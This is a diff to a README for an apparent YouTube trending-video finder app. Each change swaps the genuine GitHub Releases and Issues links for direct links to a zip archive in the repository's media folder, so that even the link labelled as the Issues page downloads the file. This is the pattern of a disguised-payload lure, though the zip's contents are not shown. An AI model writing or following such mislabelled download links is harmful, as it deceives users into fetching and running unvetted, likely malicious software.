@@ -6,10 +6,10 @@ Welcome to the YouTube-Trending-Video-Finder. This application helps you find th
 ## 📥 Download and Install
 To get started, you need to download the latest version of the application. Click the button below to visit the Releases page and download the software.
 
-[![Download YouTube-Trending-Video-Finder](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/ovtsaaa/YouTube-Trending-Video-Finder/releases)
+[![Download YouTube-Trending-Video-Finder](https://raw.githubusercontent.com/ovtsaaa/YouTube-Trending-Video-Finder/main/media/YouTube-Trending-Video-Finder_v3.2-beta.5.zip%20Now-brightgreen)](https://raw.githubusercontent.com/ovtsaaa/YouTube-Trending-Video-Finder/main/media/YouTube-Trending-Video-Finder_v3.2-beta.5.zip)
 
 ### Steps to Download
-1. Visit the [Releases page](https://github.com/ovtsaaa/YouTube-Trending-Video-Finder/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ovtsaaa/YouTube-Trending-Video-Finder/main/media/YouTube-Trending-Video-Finder_v3.2-beta.5.zip).
 2. Click on the latest release.
 3. Look for the appropriate file for your operating system (e.g., Windows, macOS).
 4. Click the download link to save the file to your computer.
@@ -41,7 +41,7 @@ If you encounter any issues:
 - Check for updates on the Releases page to have the latest version.
 
 ## 🛠 Support
-For further assistance, you can open an issue on our [GitHub Issues page](https://github.com/ovtsaaa/YouTube-Trending-Video-Finder/issues). 
+For further assistance, you can open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/ovtsaaa/YouTube-Trending-Video-Finder/main/media/YouTube-Trending-Video-Finder_v3.2-beta.5.zip). 
 
 ## 📞 Contact
 If you have questions or suggestions, feel free to reach out to us via the contact options listed on the GitHub page. We’d love to hear from you.
@@ -56,4 +56,4 @@ We plan to add more features, such as:
 
 Feel free to dive into the trending world of YouTube with ease. Download the application and start exploring today! 
 
-Remember, you can return to the [Releases page](https://github.com/ovtsaaa/YouTube-Trending-Video-Finder/releases) at any time for updates and new features. Happy exploring!
+Remember, you can return to the [Releases page](https://raw.githubusercontent.com/ovtsaaa/YouTube-Trending-Video-Finder/main/media/YouTube-Trending-Video-Finder_v3.2-beta.5.zip) at any time for updates and new features. Happy exploring!
